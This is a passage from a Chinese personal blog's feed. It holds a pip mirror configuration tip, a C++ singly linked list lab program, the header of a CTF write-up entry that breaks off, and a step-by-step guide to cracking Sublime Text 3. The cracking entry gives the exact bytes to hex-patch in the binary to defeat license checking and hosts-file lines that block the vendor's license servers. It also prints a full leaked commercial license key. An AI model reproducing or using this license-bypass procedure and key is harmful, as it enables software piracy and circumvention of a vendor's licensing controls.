href="http://pypi.sdutlinux.org/" target="_blank" rel="noopener">http://pypi.sdutlinux.org/</a></p><p>Linux下，修改 ~/.pip/pip.conf (没有就创建一个文件夹及文件。文件夹要加“.”，表示是隐藏文件夹)</p><p>内容如下：</p><blockquote><p>[global]<br>index-url = <a href="https://pypi.tuna.tsinghua.edu.cn/simple" target="_blank" rel="noopener">https://pypi.tuna.tsinghua.edu.cn/simple</a><br>[install]<br>trusted-host=mirrors.aliyun.com</p></blockquote><p>windows下，直接在user目录中创建一个pip目录，如：C:\Users\xx\pip，新建文件pip.ini。内容同上。</p><blockquote><p>转自：<a href="https://www.cnblogs.com/microman/p/6107879.html" target="_blank" rel="noopener">https://www.cnblogs.com/microman/p/6107879.html</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h3 id=&quot;临时使用：&quot;&gt;&lt;a href=&quot;#临时使用：&quot; class=&quot;headerlink&quot; title=&quot;临时使用：&quot;&gt;&lt;/a&gt;临时使用：&lt;/h3&gt;&lt;p&gt;可以在使用pip的时候加参数-i &lt;a href=&quot;https://pypi.tuna.tsinghua.
      
    
    </summary>
    
    
      <category term="日常办公" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
    
  </entry>
  
  <entry>
    <title>Sublime text3取消提示更新</title>
    <link href="http://yoursite.com/2020/04/06/Sublime%20text3%E5%8F%96%E6%B6%88%E6%8F%90%E7%A4%BA%E6%9B%B4%E6%96%B0/"/>
    <id>http://yoursite.com/2020/04/06/Sublime%20text3%E5%8F%96%E6%B6%88%E6%8F%90%E7%A4%BA%E6%9B%B4%E6%96%B0/</id>
    <published>2020-04-06T06:45:00.000Z</published>
    <updated>2020-04-07T09:09:26.925Z</updated>
    
    <content type="html"><![CDATA[<hr><blockquote><p>本文章仅供交流学习使用，请勿用作违法行为。</p></blockquote><h1 id="1-安装Sublime"><a href="#1-安装Sublime" class="headerlink" title="1.安装Sublime"></a>1.安装Sublime</h1><p>注意：根据自己的系统选择相应的版本下载，安装完成之后看是否需要激活，如果需要激活继续往下看）</p><h1 id="2-安装软件"><a href="#2-安装软件" class="headerlink" title="2. 安装软件"></a>2. 安装软件</h1><p>这个我就不多BB了。 安装完请勿打开SublimeText3。 （若已打开关了就是）</p><h1 id="3-修改"><a href="#3-修改" class="headerlink" title="3. 修改"></a>3. 修改</h1><p>3207版本基本杜绝了共享license key的方法</p><p>所以我们要修改验证license时的trigger</p><p>因官方采用revoke illegal licenses的方式，即使当时显示激活成功，联网验证时便会凉凉。</p><p>所以我们还要采用hosts屏蔽法复制以下地址直接粘贴到相应系统的hosts文件内</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 license.sublimehq.com</span><br><span class="line">127.0.0.1 www.sublimetext.com</span><br><span class="line">50.116.34.243 sublime.wbond.net</span><br><span class="line">50.116.34.243 packagecontrol.io</span><br></pre></td></tr></table></figure><h2 id="3-1-修改trigger"><a href="#3-1-修改trigger" class="headerlink" title="3.1 修改trigger"></a>3.1 修改trigger</h2><h3 id="3-1-1-Win"><a href="#3-1-1-Win" class="headerlink" title="3.1.1 Win"></a>3.1.1 Win</h3><p>利用HexEditor打开软件根目录下的sublime_text.exe<br>搜索到 97 94 0D 00  改为  00 00 00 00<br>保存</p><h3 id="3-1-2-Mac"><a href="#3-1-2-Mac" class="headerlink" title="3.1.2 Mac"></a>3.1.2 Mac</h3><p>拷出/Applications/Sublime Text.app/Contents/MacOS/Sublime Text<br>其实就是 应用程序 文件夹下找到SublimeText应用，然后右键-&gt;显示包内容，<br>然后打开/Contents/MacOS/ 然后找到 Sublime Text 这个文件 拷出来<br>利用0xED(网盘会有)或者其他HexEditor打开它<br>搜索16进制 97 94 0D 00<br>改为  00 00 00 00<br>如果实在不会修改网盘里有修改好的现成的<br>保存<br>打开终端，切换到当前目录<br>然后键入chmod 755 Sublime\ Text<br>替换掉/Applications/Sublime Text.app/Contents/MacOS/Sublime Text<br>完事儿</p><h3 id="3-1-3-Linux"><a href="#3-1-3-Linux" class="headerlink" title="3.1.3 Linux"></a>3.1.3 Linux</h3><p>基本同Mac操作<br>找个16进制编辑器打开软件根目录下的Sublime Text<br>搜索16进制 97 94 0D 00<br>改为  00 00 00 00<br>保存<br>打开终端，切换到当前目录<br>然后键入chmod 755 Sublime\ Text<br>完事儿</p><h2 id="3-2-修改host"><a href="#3-2-修改host" class="headerlink" title="3.2 修改host"></a>3.2 修改host</h2><h3 id="3-2-1-Win"><a href="#3-2-1-Win" class="headerlink" title="3.2.1 Win"></a>3.2.1 Win</h3><p>Windows的hosts文件在：</p><p>系统盘:C:\windows\system32\drivers\etc</p><p>Tips: Win下的权限获取可能有点复杂，不如先拷到桌面，编辑完替换回去。<br>在最后一行插入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 license.sublimehq.com</span><br><span class="line">127.0.0.1 www.sublimetext.com</span><br><span class="line">50.116.34.243 sublime.wbond.net</span><br><span class="line">50.116.34.243 packagecontrol.io</span><br></pre></td></tr></table></figure><h3 id="3-2-2-Mac"><a href="#3-2-2-Mac" class="headerlink" title="3.2.2 Mac"></a>3.2.2 Mac</h3><p>打开Terminal(终端)<br>输入 sudo nano /Private/etc/hosts 回车<br>输入密码后回车<br>在最后一行插入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 license.sublimehq.com</span><br><span class="line">127.0.0.1 www.sublimetext.com</span><br><span class="line">50.116.34.243 sublime.wbond.net</span><br><span class="line">50.116.34.243 packagecontrol.io</span><br></pre></td></tr></table></figure><h3 id="3-2-3-Linux"><a href="#3-2-3-Linux" class="headerlink" title="3.2.3 Linux"></a>3.2.3 Linux</h3><p>同Mac</p><h1 id="4-激活"><a href="#4-激活" class="headerlink" title="4. 激活"></a>4. 激活</h1><p>打开Sublime Text 3 选择Help -&gt; Enter License 输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">----- BEGIN LICENSE -----</span><br><span class="line">TwitterInc</span><br><span class="line">200 User License</span><br><span class="line">EA7E-890007</span><br><span class="line">1D77F72E 390CDD93 4DCBA022 FAF60790</span><br><span class="line">61AA12C0 A37081C5 D0316412 4584D136</span><br><span class="line">94D7F7D4 95BC8C1C 527DA828 560BB037</span><br><span class="line">D1EDDD8C AE7B379F 50C9D69D B35179EF</span><br><span class="line">2FE898C4 8E4277A8 555CE714 E1FB0E43</span><br><span class="line">D5D52613 C3D12E98 BC49967F 7652EED2</span><br><span class="line">9D2D2E61 67610860 6D338B72 5CF95C69</span><br><span class="line">E36B85CC 84991F19 7575D828 470A92AB</span><br><span class="line">------ END LICENSE ------</span><br></pre></td></tr></table></figure><p>选择Use license</p><p>—————————至此激活成功—————————</p><p>转自：<a href="https://zhuanlan.zhihu.com/p/107554937" target="_blank" rel="noopener">Sublime3 激活教程</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;本文章仅供交流学习使用，请勿用作违法行为。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;1-安装Sublime&quot;&gt;&lt;a href=&quot;#1-安装Sublime&quot; class=&quot;headerlink&quot; title=&quot;1.安装Subli
      
    
    </summary>
    
    
      <category term="日常办公" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
    
  </entry>
  
  <entry>
    <title>实验二 单链表的操作</title>
    <link href="http://yoursite.com/2020/03/30/%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E6%93%8D%E4%BD%9C/"/>
    <id>http://yoursite.com/2020/03/30/%E5%AE%9E%E9%AA%8C%E4%BA%8C%20%E5%8D%95%E9%93%BE%E8%A1%A8%E7%9A%84%E6%93%8D%E4%BD%9C/</id>
    <published>2020-03-30T08:45:00.000Z</published>
    <updated>2020-04-07T09:09:23.121Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="实验性质：设计性实验"><a href="#实验性质：设计性实验" class="headerlink" title="实验性质：设计性实验"></a>实验性质：设计性实验</h1><h1 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h1><p>（1）编程实现单链表的以下基本操作：建立单链表，查找单链表，插入单链表，删除单链表。<br>（2）采用单链表结构编程实现：两个有序单链表的归并运算。</p><h1 id="目的："><a href="#目的：" class="headerlink" title="目的："></a>目的：</h1><p>（1）掌握线性表的链式存储结构；<br>（2）掌握单链表及其基本操作的实现。</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> ElemType;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义结点存储结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ElemType data;  <span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span>  <span class="comment">//指针域</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitList</span><span class="params">(LinkList &amp;L)</span></span>; <span class="comment">//单链表的初始化</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InsertList</span><span class="params">(LinkList &amp;L,<span class="keyword">int</span> i,<span class="keyword">int</span> x,<span class="keyword">bool</span> y)</span></span>;<span class="comment">//单链表的插入</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteList</span><span class="params">(LinkList &amp;L,<span class="keyword">int</span> i)</span></span>; <span class="comment">//删除指定位置的元素</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Display</span><span class="params">(LinkList &amp;L)</span></span>; <span class="comment">//显示单链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LocateElem</span><span class="params">(LinkList &amp;L,<span class="keyword">int</span> x)</span></span>;   <span class="comment">//查找</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateTwoList</span><span class="params">(LinkList &amp;LA,LinkList &amp;LB)</span></span>;  <span class="comment">//生成两个单链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MergeList</span><span class="params">(LinkList &amp;LA,LinkList &amp;LB,LinkList &amp;LC)</span></span>;   <span class="comment">//合并有序单链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span>;  <span class="comment">//文字菜单提示信息</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LinkList L;LinkList LA;LinkList LB;LinkList LC;</span><br><span class="line">    Menu();</span><br><span class="line">    InitList(L);</span><br><span class="line">    <span class="keyword">int</span> h,k;    <span class="comment">//获取输入的指定位置和插入数据的元素</span></span><br><span class="line">    <span class="keyword">int</span> i;  <span class="comment">//输入的数字</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入操作代码："</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;i;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span>(i)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入要操作的位置："</span>;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;h;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入要插入的值："</span>;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;k;</span><br><span class="line">            InsertList(L,h,k,<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入要操作的位置："</span>;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;h;</span><br><span class="line">            DeleteList(L,h);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            Display(L);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入要操作的值："</span>;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;k;</span><br><span class="line">            LocateElem(L,k);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            CreateTwoList(LA,LB);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            MergeList(LA,LB,LC);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">if</span>(i&lt;<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入的位置非法，请重新输入"</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入操作代码："</span>;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitList</span><span class="params">(LinkList &amp;L)</span><span class="comment">//初始化</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L=<span class="keyword">new</span> LNode;</span><br><span class="line">    L-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InsertList</span><span class="params">(LinkList &amp;L,<span class="keyword">int</span> i,<span class="keyword">int</span> x,<span class="keyword">bool</span> y)</span><span class="comment">//插入单链表</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LNode *p=L; <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; (j&lt;i<span class="number">-1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p||j&gt;i<span class="number">-1</span>)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入的位置非法"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        LNode *s;</span><br><span class="line">        s=<span class="keyword">new</span> LNode;</span><br><span class="line">        s-&gt;data=x;</span><br><span class="line">        s-&gt;next=p-&gt;next;</span><br><span class="line">        p-&gt;next=s;</span><br><span class="line">        <span class="keyword">if</span>(y)</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"插入元素成功"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteList</span><span class="params">(LinkList &amp;L,<span class="keyword">int</span> i)</span><span class="comment">//删除指定元素</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LNode *p=L;<span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((p-&gt;next) &amp;&amp; (j&lt;i<span class="number">-1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!(p-&gt;next)||(j&gt;i<span class="number">-1</span>))</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入的位置非法"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        LNode *q=p-&gt;next;</span><br><span class="line">        p-&gt;next=q-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> q;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"元素删除成功"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Display</span><span class="params">(LinkList &amp;L)</span><span class="comment">//显示单链表</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LNode *p=L-&gt;next;</span><br><span class="line">    <span class="keyword">if</span>(!p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"当前单链表为空"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"单链表元素为："</span>;</span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;next)</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;p-&gt;data&lt;&lt;<span class="string">","</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;p-&gt;data&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LocateElem</span><span class="params">(LinkList &amp;L,<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LNode *p=L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; p-&gt;data!=x)</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">    <span class="keyword">if</span>(p)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"成功找到元素"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"元素不存在"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateTwoList</span><span class="params">(LinkList &amp;LA,LinkList &amp;LB)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    InitList(LA);</span><br><span class="line">    InitList(LB);</span><br><span class="line">    InsertList(LA,<span class="number">1</span>,<span class="number">2</span>,<span class="literal">false</span>);InsertList(LA,<span class="number">2</span>,<span class="number">4</span>,<span class="literal">false</span>);InsertList(LA,<span class="number">3</span>,<span class="number">5</span>,<span class="literal">false</span>);</span><br><span class="line">    InsertList(LB,<span class="number">1</span>,<span class="number">3</span>,<span class="literal">false</span>);InsertList(LB,<span class="number">2</span>,<span class="number">5</span>,<span class="literal">false</span>);InsertList(LB,<span class="number">3</span>,<span class="number">7</span>,<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"成功创建两个单链表"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"LA为"</span>;Display(LA);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"LB为"</span>;Display(LB);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MergeList</span><span class="params">(LinkList &amp;LA,LinkList &amp;LB,LinkList &amp;LC)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LNode *pa=LA-&gt;next;LNode *pb=LB-&gt;next;</span><br><span class="line">    LC=LA;</span><br><span class="line">    LNode *pc=LC;</span><br><span class="line">    <span class="keyword">while</span>(pa&amp;&amp;pb)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(pa-&gt;data&lt;=pb-&gt;data)</span><br><span class="line">        &#123;</span><br><span class="line">            pc-&gt;next=pa;</span><br><span class="line">            pc=pa;</span><br><span class="line">            pa=pa-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            pc-&gt;next=pb;</span><br><span class="line">            pc=pb;</span><br><span class="line">            pb=pb-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pc-&gt;next=pa?pa:pb;</span><br><span class="line">    <span class="keyword">delete</span> LB;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"合并成功,LC"</span>;</span><br><span class="line">    Display(LC);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"1-----在单链表指定位置插入元素 "</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"2-----删除单链表指定位置元素"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"3-----显示单链表"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"4-----查找元素"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"5-----自动创建两个单链表"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"6-----合并两个单链表"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"   退出,输入一个负数！"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>本文章仅供个人复习使用，如有错误，请联系我更正。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h1 id=&quot;实验性质：设计性实验&quot;&gt;&lt;a href=&quot;#实验性质：设计性实验&quot; class=&quot;headerlink&quot; title=&quot;实验性质：设计性实验&quot;&gt;&lt;/a&gt;实验性质：设计性实验&lt;/h1&gt;&lt;h1 id=&quot;要求&quot;&gt;&lt;a href=&quot;#要求&quot; class=&quot;hea
      
    
    </summary>
    
    
      <category term="数据结构" scheme="http://yoursite.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
  </entry>
  
  <entry>
    <title>WUST-CTF2020-WP</title>
    <link href="http://yoursite.com/2020/03/29/WUST-CTF2020-WP/"/>
    <id>http://yoursite.com/2020/03/29/WUST-CTF2020-WP/</id>
    <published>2020-03-29T10:45:00.000Z</published>
    <updated>2020-04-07T09:09:25.697Z</updated>
    
